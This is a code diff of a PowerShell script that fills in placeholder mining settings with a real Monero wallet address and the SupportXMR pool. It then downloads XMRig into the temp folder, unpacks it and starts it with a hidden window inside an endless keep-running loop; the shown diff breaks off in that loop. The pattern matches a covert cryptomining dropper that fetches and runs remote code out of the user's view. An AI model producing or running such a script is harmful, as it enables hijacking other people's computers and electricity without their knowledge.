@@ -1,13 +1,14 @@
 # Mining configuration
-$wallet = "your-wallet-address-here"
-$pool = "pool-address-here"
-$algorithm = "algorithm-name"  # e.g., "ethash", "kawpow", "autolykos2"
+$wallet = "43eudQkRnBXUBLi6foVMaxBX4JFH7g56SaySBaK4aBxEJNtfHcGiLYyJHpxDYGzS4B4QPEBoRaGShQFV5oGYz8bAAdfhLWt"  # Your Monero address
+$pool = "stratum+tcp://pool.supportxmr.net:5555"  # SupportXMR pool
+$algorithm = "randomx"  # Monero's algorithm
 
-# Download mining software
-Invoke-WebRequest -Uri "https://link-to-miner-binary.exe" -OutFile "$env:TEMP\miner.exe"
+# Download XMRig (Monero miner)
+Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-v6.20.0-win-x64.zip" -OutFile "$env:TEMP\xmrig.zip"
+Expand-Archive "$env:TEMP\xmrig.zip" -DestinationPath "$env:TEMP\xmrig" -Force
 
 # Start mining process
-Start-Process -FilePath "$env:TEMP\miner.exe" -ArgumentList "-a $algorithm -o $pool -u $wallet" -WindowStyle Hidden
+Start-Process -FilePath "$env:TEMP\xmrig\xmrig.exe" -ArgumentList "--url $pool --user $wallet --cpu" -WindowStyle Hidden
 
 # Keep process running
 while ($true) {
